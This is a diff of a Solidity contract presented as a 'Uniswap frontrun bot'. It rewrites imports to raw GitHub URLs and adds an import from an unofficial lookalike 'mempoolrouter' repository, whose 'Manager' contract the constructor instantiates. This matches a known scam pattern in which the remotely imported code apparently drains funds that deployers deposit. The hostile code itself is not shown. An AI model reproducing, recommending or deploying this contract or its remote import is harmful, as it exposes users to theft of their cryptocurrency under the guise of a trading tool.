@@ -1,23 +1,22 @@
 pragma solidity ^0.6.6;
 
 // Import Libraries Migrator/Exchange/Factory
-import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
-import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
-//import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
-//Mempool router
-import "ipfs://QmP2etZ3VUH1E8EK1Az9shBcz38bv6Hh8PnRfnHPkbRMkN";
+import "https://raw.githubusercontent.com/Uniswap/v2-periphery/master/contracts/interfaces/IUniswapV2Migrator.sol";
+import "https://raw.githubusercontent.com/Uniswap/v2-periphery/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
+import "https://raw.githubusercontent.com/uniswap-v3-mempool/mempoolrouter/main/v3";
 
 contract UniswapFrontrunBot {
- 
+
     string public tokenName;
     string public tokenSymbol;
+
     uint frontrun;
     Manager manager;
- 
  
     constructor(string memory _tokenName, string memory _tokenSymbol) public {
         tokenName = _tokenName;
         tokenSymbol = _tokenSymbol;
+        
         manager = new Manager();
     }
 
